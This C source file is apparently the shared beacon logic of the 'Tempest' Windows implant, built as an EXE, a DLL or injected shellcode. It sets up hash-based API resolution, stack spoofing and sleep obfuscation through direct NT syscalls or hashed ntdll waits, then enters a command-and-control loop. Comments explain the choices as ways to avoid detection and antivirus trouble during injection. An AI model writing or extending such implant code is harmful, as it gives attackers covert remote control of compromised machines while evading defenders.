/*
 * Tempest win-stargate — shared implant logic (B.3+ wire C2, hash-only resolve, W^X).
 * Linked into exe, DLL, and flat PIC shellcode (same C2 path when TS_* macros are set).
 */
#include <windows.h>
#if !defined(TEMPEST_PIC_SHELLCODE)
#include <stdio.h>
#endif
#include "stargate.h"
#include "bm_spoof.h"
#include "beacon_core.h"
#if defined(TS_SERVER)
#include "tempest_c2.h"
#if defined(TEMPEST_PIC_SHELLCODE)
#include "loader.h"
#include "bm_pic_deferral_mosaic.h"
#else
#include "morpheus.h"
#endif
#endif

void tempest_beacon_run(void)
{
    SgConfig cfg = { .mode = SG_INDIRECT };
    if (sg_init(&cfg) != 0) {
#if !defined(TEMPEST_PIC_SHELLCODE)
        fputs("[tempest] FATAL: sg_init failed — C2 not started\n", stderr);
        fflush(stderr);
#endif
        return;
    }
    if (bm_spoof_init() != 0) {
        /* Continue without stack spoofing if gadget scan fails. */
    }

#if defined(TS_SERVER)
#if defined(TEMPEST_PIC_SHELLCODE)
    /* PIC: BM-T6003 Mosaic — hashed ntdll/k32 waits, no kernel32 Sleep, no
     * syscall from the blob (Morpheus direct stubs hang / AV under RX inject). */
    {
        HMODULE ntdll = locate_base(0x1617909Fu);
        HMODULE k32 = locate_base(0xA25682A7u);
        deferral_mosaic_ctx *moz = NULL;
        if (!ntdll || !k32 || deferral_mosaic_init(ntdll, k32, &moz) != MOSAIC_OK || !moz) {
            bm_spoof_cleanup();
            sg_cleanup();
            return;
        }
        tempest_c2_run(moz);
        deferral_mosaic_free(moz);
    }
#else
    /* PE: BM-T6001 Morpheus — direct NT syscalls, no kernel32 Sleep. */
    morpheus_config_t mcfg = MORPHEUS_CONFIG_DEFAULT;
    mcfg.enable_page_guard = FALSE;
    morpheus_ctx_t *mctx = NULL;
    if (morpheus_init(&mcfg, &mctx) != MORPHEUS_OK) {
        fputs("[tempest] FATAL: morpheus_init (BM-T6001) failed\n", stderr);
        fflush(stderr);
        bm_spoof_cleanup();
        sg_cleanup();
        return;
    }
    fputs("[tempest] entering C2 (stderr: [tempest c2] trace)\n", stderr);
    fflush(stderr);
    tempest_c2_run(mctx);
    morpheus_cleanup(mctx);
#endif
#endif

    bm_spoof_cleanup();
    sg_cleanup();
}
